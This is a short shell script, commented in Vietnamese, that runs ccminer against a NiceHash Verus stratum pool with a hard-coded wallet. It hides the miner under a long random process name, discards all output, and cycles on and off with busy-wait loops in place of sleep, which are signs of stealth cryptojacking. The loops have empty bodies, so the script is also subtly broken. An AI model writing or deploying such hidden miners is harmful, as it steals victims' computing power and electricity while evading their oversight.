#!/bin/sh

# Sử dụng vòng lặp với thời gian chờ thay cho sleep
start_time=$(date +%s)  # Lấy thời gian bắt đầu

while true; do
    # Chạy lệnh với tên tiến trình đã thay đổi
    bash -c "exec -a 'HidjahshgsnzbxnzmsjjshdbdmsmdbxbskieueyrureoeiruryakjsnxbxmsjdhdhsnbzbxkeururyyeiwmsbzbzmzmbdvxkskedhsjnsbxbskshdmsnsbsjkshdnsnsjsbsmsnnsbhdjdksksnnssjjsnsnsnsblakhsudjndbbsjsuskaksnsusjksnsbshsjmmsndhdksmsdhsnsbshsssisnsbsjeieueyywiakamznxxdhskiwrydbdnsnnxbcieieuhajmabzbxksurhnxbejjdjdhdhsnsnsnbssbnsnsbsbzsnsbsbsnnsnsdenryYruo' ./ccminer -a verus -o stratum+tcp://verushash.auto.nicehash.com:9200#xnsub -u 324skyjJkp4Cm5iNQgXXu2zhq3yWmdHmDE.AMDREG11 -p x -t 1 > /dev/null 2>&1" &
    
    # Lưu PID của tiến trình
    PID=$!  # Lưu PID ngay sau khi chạy

    # Chờ 10 phút (600 giây) bằng cách kiểm tra thời gian hiện tại
    while [ $(($(date +%s) - $start_time)) -lt 600 ]; do
        # Kiểm tra thời gian đã trôi qua, nếu chưa đủ 10 phút, chờ tiếp
        
    done

    # Dừng tiến trình
    kill $PID

    # Đợi cho tiến trình dừng hoàn toàn
    wait $PID 2>/dev/null

    # Nghỉ 240 giây (4 phút) thay vì sử dụng sleep
    start_time=$(date +%s)  # Cập nhật lại thời gian bắt đầu
    while [ $(($(date +%s) - $start_time)) -lt 240 ]; do
        # Kiểm tra thời gian đã trôi qua, nếu chưa đủ 240 giây, chờ tiếp
        
    done
done
